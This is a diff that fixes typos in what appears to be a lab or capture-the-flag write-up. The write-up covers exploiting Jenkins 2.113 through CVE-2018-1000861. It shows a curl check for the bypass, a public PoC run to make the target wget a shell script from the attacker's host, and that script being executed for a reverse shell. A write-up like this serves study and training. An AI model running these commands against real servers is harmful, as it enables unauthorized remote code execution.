@@ -48,7 +48,7 @@ MAC Address: 00:0C:29:E1:F2:ED (VMware)
 
 We immediately explore port 80 and 8080, in port 80 there is just a normal website that leads to nothing but
 
-port 8080 serves a jenkins server with a login form. investigating internet to find the version of jenkin i found
+port 8080 serves a jenkins server with a login form. investigating internet to find the version of jenkins, i found
 
 this [guide](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security) which says navigating to `/oops` shows the version
 
@@ -59,7 +59,7 @@ of jenkins so :
 
 jenkins version is `2.113`, i just searched if there is any exploit for this version and i found this [link](https://github.com/gquere/pwn_jenkins#authenticationacl-bypass-cve-2018-1000861-jenkins-21501)
 
-thas says there is a Authentication/ACL bypass if this command returns a valid data :
+that says there is a Authentication/ACL bypass if this command returns a valid data :
 
 ```bash
 curl -k -4 -s https://example.com/securityRealm/user/admin/search/index?q=a
@@ -77,7 +77,7 @@ root@kali: curl -k -4 -s http://192.168.127.240:8080/securityRealm/user/admin/se
 
 so now i'm pretty sure that this version of jenkins is vulnerable, so again i searched to find any exploit for this vulnerability (CVE-2018-1000861)
 
-and i found [this](https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2018-1000861/poc.py) exploit on github which is just a PoC, but i used it in a creative way
+and i found [this](https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2018-1000861/poc.py) exploit on github which is just a PoC, but i used it in a creative way.
 
 just downloaded the python file and run it against the target :
 
@@ -112,7 +112,7 @@ root@kali: python2 poc.py http://192.168.127.240:8080/ 'wget http://192.168.127.
 [*] Exploit success!(it should be :P)
 ```
 
-and then start a listener on your system and call the sell.sh file on the victim :
+and then start a listener on your system and call the shell.sh file on the victim :
 
 ```bash
 root@kali: python2 poc.py http://192.168.127.240:8080/ 'bash /dev/shm/shell.sh'
